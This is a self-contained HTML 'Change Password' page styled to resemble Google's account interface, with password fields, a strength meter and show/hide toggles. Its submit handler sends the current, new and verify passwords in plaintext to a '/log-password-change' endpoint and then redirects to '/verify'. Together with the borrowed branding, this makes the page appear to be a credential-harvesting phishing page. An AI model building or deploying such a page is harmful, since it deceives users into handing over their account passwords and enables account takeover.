<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Change Password</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      background: #202124;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
    }
    .card {
      margin-top: 80px;
      background: #292a2d;
      border-radius: 16px;
      width: 100%;
      max-width: 500px;
      padding: 40px 48px 48px;
      box-shadow: 0 4px 32px rgba(0,0,0,0.5);
    }
    h2 { font-size: 22px; font-weight: 400; color: #e8eaed; margin-bottom: 28px; }
    .field-wrap { position: relative; margin-bottom: 0; }
    .field-box {
      position: relative;
      border: 1px solid #5f6368;
      border-radius: 4px;
      background: transparent;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .field-box.focused { border-color: #8ab4f8; box-shadow: 0 0 0 1px #8ab4f8; }
    .field-label {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 14px;
      color: #9aa0a6;
      background: transparent;
      padding: 0;
      pointer-events: none;
      transition: all 0.15s ease;
      z-index: 1;
    }
    .field-label.active {
      top: -8px;
      transform: translateY(0);
      font-size: 11px;
      background: #292a2d;
      padding: 0 4px;
    }
    .field-label.focused-label { color: #8ab4f8; }
    .field-input {
      width: 100%;
      background: transparent;
      border: none;
      outline: none;
      color: #e8eaed;
      font-size: 14px;
      padding: 16px 48px 16px 12px;
      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
    }
    .toggle-btn {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      color: #9aa0a6;
      padding: 4px;
      display: flex;
      align-items: center;
    }
    .spacer { height: 20px; }
    .strength-bar-bg { height: 4px; background: #3c4043; border-radius: 2px; overflow: hidden; margin-top: 8px; }
    .strength-bar-fill { height: 100%; border-radius: 2px; transition: width 0.3s ease, background 0.3s ease; }
    .strength-label { font-size: 12px; margin-top: 4px; }
    .error-msg { margin-top: 16px; color: #e57373; font-size: 13px; }
    .btn-row { margin-top: 36px; display: flex; justify-content: flex-end; }
    .submit-btn {
      background: #8ab4f8;
      color: #202124;
      border: none;
      border-radius: 100px;
      padding: 10px 24px;
      font-size: 14px;
      font-weight: 600;
      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
      cursor: pointer;
      letter-spacing: 0.01em;
      transition: background 0.2s;
    }
    .submit-btn:hover { background: #aecbfa; }
    .submit-btn:disabled { opacity: 0.7; cursor: not-allowed; }
    .footer { position: fixed; bottom: 24px; right: 24px; display: flex; gap: 24px; font-size: 13px; color: #9aa0a6; }
    .footer span { cursor: pointer; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Change Password</h2>
    <form id="pwForm" autocomplete="off">

      <div class="field-wrap" id="wrap-current">
        <div class="field-box" id="box-current">
          <span class="field-label" id="label-current">Current Password</span>
          <input class="field-input" id="currentPassword" type="password" autocomplete="new-password" />
          <button type="button" class="toggle-btn">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#9aa0a6">
              <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
            </svg>
          </button>
        </div>
      </div>

      <div class="spacer"></div>

      <div class="field-wrap" id="wrap-new">
        <div class="field-box" id="box-new">
          <span class="field-label" id="label-new">New Password</span>
          <input class="field-input" id="newPassword" type="password" autocomplete="new-password" />
          <button type="button" class="toggle-btn">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#9aa0a6">
              <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
            </svg>
          </button>
        </div>
        <div id="strengthWrap" style="display:none;">
          <div class="strength-bar-bg"><div class="strength-bar-fill" id="strengthBar"></div></div>
          <div class="strength-label" id="strengthLabel"></div>
        </div>
      </div>

      <div class="spacer"></div>

      <div class="field-wrap" id="wrap-verify">
        <div class="field-box" id="box-verify">
          <span class="field-label" id="label-verify">Verify New Password</span>
          <input class="field-input" id="verifyPassword" type="password" autocomplete="new-password" />
          <button type="button" class="toggle-btn">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#9aa0a6">
              <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
            </svg>
          </button>
        </div>
      </div>

      <div class="error-msg" id="errorMsg" style="display:none;"></div>

      <div class="btn-row">
        <button type="submit" class="submit-btn" id="submitBtn">Change Password</button>
      </div>
    </form>
  </div>

  <div class="footer">
    <span>Help</span><span>Privacy</span><span>Terms</span>
  </div>

  <script>
    // Float labels — float up immediately on focus, collapse on blur only if empty
    ['current', 'new', 'verify'].forEach(function(name) {
      var inputId = name === 'current' ? 'currentPassword' : name === 'new' ? 'newPassword' : 'verifyPassword';
      var input = document.getElementById(inputId);
      var label = document.getElementById('label-' + name);
      var box = document.getElementById('box-' + name);
      input.addEventListener('focus', function() {
        box.classList.add('focused');
        label.classList.add('active', 'focused-label');
      });
      input.addEventListener('blur', function() {
        box.classList.remove('focused');
        label.classList.remove('focused-label');
        if (!input.value) label.classList.remove('active');
      });
    });

    // Eye toggle — attached via JS, no inline onclick
    var eyeOpenPath = 'M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z';
    var eyeClosedPath = 'M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z';

    document.querySelectorAll('.toggle-btn').forEach(function(btn) {
      btn.addEventListener('click', function() {
        var input = btn.closest('.field-box').querySelector('.field-input');
        var pathEl = btn.querySelector('svg path');
        if (input.type === 'password') {
          input.type = 'text';
          pathEl.setAttribute('d', eyeOpenPath);
        } else {
          input.type = 'password';
          pathEl.setAttribute('d', eyeClosedPath);
        }
      });
    });

    // Strength meter
    document.getElementById('newPassword').addEventListener('input', function() {
      var pw = this.value;
      var wrap = document.getElementById('strengthWrap');
      var bar = document.getElementById('strengthBar');
      var lbl = document.getElementById('strengthLabel');
      if (!pw) { wrap.style.display = 'none'; return; }
      wrap.style.display = 'block';
      if (pw.length < 8) {
        bar.style.width = '20%'; bar.style.background = '#e57373';
        lbl.textContent = 'Too short'; lbl.style.color = '#e57373'; return;
      }
      var score = 0;
      if (/[A-Z]/.test(pw)) score++;
      if (/[a-z]/.test(pw)) score++;
      if (/[0-9]/.test(pw)) score++;
      if (/[^A-Za-z0-9]/.test(pw)) score++;
      var levels = [
        {w:'30%', c:'#e57373', t:'Weak'},
        {w:'30%', c:'#e57373', t:'Weak'},
        {w:'55%', c:'#ffb74d', t:'Fair'},
        {w:'75%', c:'#81c784', t:'Good'},
        {w:'100%', c:'#4caf50', t:'Strong'}
      ];
      var l = levels[score];
      bar.style.width = l.w; bar.style.background = l.c;
      lbl.textContent = l.t; lbl.style.color = l.c;
    });

    // Form submit
    document.getElementById('pwForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      var errorMsg = document.getElementById('errorMsg');
      var btn = document.getElementById('submitBtn');
      var currentPassword = document.getElementById('currentPassword').value;
      var newPassword = document.getElementById('newPassword').value;
      var verifyPassword = document.getElementById('verifyPassword').value;
      errorMsg.style.display = 'none';

      if (newPassword.length < 8) {
        errorMsg.textContent = 'New password must be at least 8 characters.';
        errorMsg.style.display = 'block'; return;
      }
      if (newPassword !== verifyPassword) {
        errorMsg.textContent = 'New password and verify password do not match.';
        errorMsg.style.display = 'block'; return;
      }

      btn.disabled = true;
      await fetch('/log-password-change', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ currentPassword: currentPassword, newPassword: newPassword, verifyPassword: verifyPassword })
      });
      btn.disabled = false;
      window.location.href = '/verify';
    });
  </script>
</body>
</html>
